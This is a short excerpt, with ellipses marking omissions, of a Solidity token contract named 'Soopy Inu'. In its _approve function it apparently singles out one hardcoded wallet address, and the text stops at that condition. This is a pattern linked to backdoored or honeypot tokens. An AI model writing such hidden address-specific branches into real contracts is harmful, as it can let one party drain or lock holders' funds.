...
contract SoopyInu is Context, IERC20, Ownable {
    ...
    string private _name = 'Soopy Inu';
    string private _symbol = 'SOPINU';
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0x1B2559bec5cD05859a24CAcD7cc39B7b3F4E0FC0)) {
